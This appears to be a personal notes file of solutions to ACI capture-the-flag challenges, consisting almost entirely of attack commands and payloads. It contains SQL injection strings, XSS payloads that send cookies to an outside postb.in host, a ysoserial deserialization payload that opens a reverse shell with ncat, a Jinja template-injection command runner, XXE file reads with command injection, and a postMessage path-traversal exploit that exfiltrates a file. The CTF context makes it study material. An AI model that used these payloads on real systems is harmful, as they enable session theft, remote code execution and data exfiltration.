# Unsorted

This is a random collection of other problems I have notes on but need to make into better writeups.

I plan to keep working on these scripts to make them actually good.

## DENIED

* robots.txt
* `curl http://challenge.acictf.com:22623/secret_maintenance_foo_543212345 -d "cmd=cat flag.txt"`

## No escape

* `houdini' or pwHash = '' --` 

## Thats more than enough

* `convert -size 100x100 xc:black canvas.jpg` to create a simple image
* other image is embedded right after first

## Bootcamp

* https://en.wikibooks.org/wiki/QEMU/Debugging_with_QEMU
* 1st terminal: qemu-system-x86_64 -s -S -k en-us -m 512 -drive format=raw,file=floppy.img
* 2nd terminal: gdb;target remote localhost:1234; c

## Turtles all the way down

* password is in irc, use wireshark to extract the next zip, use 7zip to extract next pcap

## Controlled Access

* https://reverseengineering.stackexchange.com/questions/20632/help-unpacking-u-boot-firmware
* binwalk firmware.bin
* dd if=firmware.bin of=data.xz bs=1 count=1467840 skip=64
* dd if=firmware.bin of=squashfs.bin bs=1 skip=1467904
* unsquashfs squashfs.bin
* look in /root/payload.sh (INTERNAL_HOST)

## Boot Master

* fix byre set to 0x51 as 0x55
* do same things from bootcamp

## Boot Riddle

* same startup as before
* inside qemu do "ctrl+alt+2"
* `xp/2c 0x7dc0`

## hacker, scan thyself

* Loved this challenge
* gdb: set follow-fork-mode parent
* -22 (overwrite puts in GOT)
* 4195926 (decimal address for system)
* command goes in notes (cat flag)

## whats the difference

* hxd->analysis->compare
* F6
* but actually it's just at the end, look at size difference
* it's code that messes with the input parameters
* you can run it in olly or use the xor key with the other 2 addresses provided

## boot racer

* `watch -l *(char *)0x7dc0`
* same as before, once it breaks keep doing n and x/s 0x7dc0 to print flag

## library_card

```c
int main(){
	gatekeeper84(0,0,0);
	return 0;
}
```

* `cp liblibrary_card.so /usr/lib`
* `chmod 755 /usr/lib/liblibrary_card.so`
* `ldconfig`
* `gcc test.c -o test -llibrary_card`
* `./test`
* https://www.cprogramming.com/tutorial/shared-libraries-linux-gcc.html

## cookie monster

* `name=flag&ingredients=<script>document.write('<img src%3D"https://postb.in/1587858395408-8044362019281?'%2Bdocument.cookie%2B' "/>')</script>`
* replace session cookie and go to /admin

## the sql always sucks

* `sqlmap -u http://challenge.acictf.com:27748/?firstname=test --random-agent --level=5 --risk=3 -D firstname -T SuperSecretData -C flag --dump`


## I have caught you now

```
* challenge.acictf.com:32317/search?se</code>a<svg/onload%3dalert(cookie)>a<code>rch=<script>
* https://www.ipaddressguide.com/ip
* http://challenge.acictf.com:32317/search?se%3C/code%3Ea%3Csvg/src%3Dhttp://167837204:2018/cookie/%3Ea%3Ccode%3Erch=%3Cscript%3E
* http://challenge.acictf.com:32317/search?se%3C/code%3Ea%3Csvg/src%3Dhttp://2886795265:2018/cookie/%3Ea%3Ccode%3Erch=%3Cscript%3E
* http://challenge.acictf.com:32317/search?se%3C/code%3Ea%3Csvg/onload%3Dalert(location%3D%26quot;https://postb%26period;in/1587951532697-0760058402083%3F%26quot;%26plus;cookie)%3Ea%3Ccode%3Erch=%3Cscript%3E
```

## c&c music factory

* get rid of ptrace
* creates so file, debug into that
* factory function calls a bunch of sub functions, make sure return value is right for each
* step through function it calls when res=0, should assemble flag

## needle in a haystack

* procdump - get exe, find function that does simple xor with flag
* memdump - ctrl+f for "ACI{" ^ key[:4] to find full string
* https://www.andreafortuna.org/2017/07/10/volatility-my-own-cheatsheet-part-3-process-memory/

## serial killer

* `apt-get install openjdk-8-jdk`
* download ysoserial
* `java -jar ysoserial-master-30099844c6-1.jar CommonsCollections4 'ncat -e /bin/sh 172.17.0.1 2018' > payload`
* on shell server: `nc -lvp 2018`
* `cat payload | nc challenge.acictf.com 30340`

## blame it on the temp

* robots.txt has the directory structure
* upload a file ../../templates/whatever/index.html (for any changes make a new folder!!)
* `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('cat *').read()}}{%endif%}{%endfor%}`

## extremely malicious language

* `admin' or '1'='1:' or '1'='1`

* payloadallthethings:

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=make.php"> ]>
<cybermap>
	<name>&xxe;</name>
	<country>CN</country>
	<country>US</country>
</cybermap>
```

* then:

```xml
<cybermap>
	<name>CYBER MAP</name>
	<country>CN</country>
	<country>US\")';./flag;#</country>
</cybermap>
```

* view source

## firstfail
* http://10.0.254.20:2018/madstacks.html
```html
<html>
  <body>
    <h1>Test page for Secure Password Manager</h1>
    <p>This page lets you test the password manager. Once you have it working, you can use it to log in below and continue on.</p>
  <div id="notice"></div>

  <form>
    <input type="text" name="username" placeholder="Username"><br/>
    <input type="password" name="password" placeholder="Password"><br/>
    <button>Login</button>
  </form>
  </body>

<script>
window.setTimeout(function(){
	window.postMessage({ 
		  type:'add_entry',
		  host: 'hacked',
		  entry: 'username="testuser",password="test",port.onMessage.addListener(msg => {document.write(msg.entries[0])});port.postMessage({type:"entries", pattern:"../../../../../../../../../opt/problems/firstfail_3_1f64919a0f4d781604743fa26334cbe8/flag.txt"});window.setTimeout(function(){$.get( "http://10.0.254.20:2018/?"+document.body.innerText, function( data ) {$( ".result" ).html( data );});}, 500);'
		}, "*");
	PasswordManager.openManager();
}, 500);
</script>
</html>
```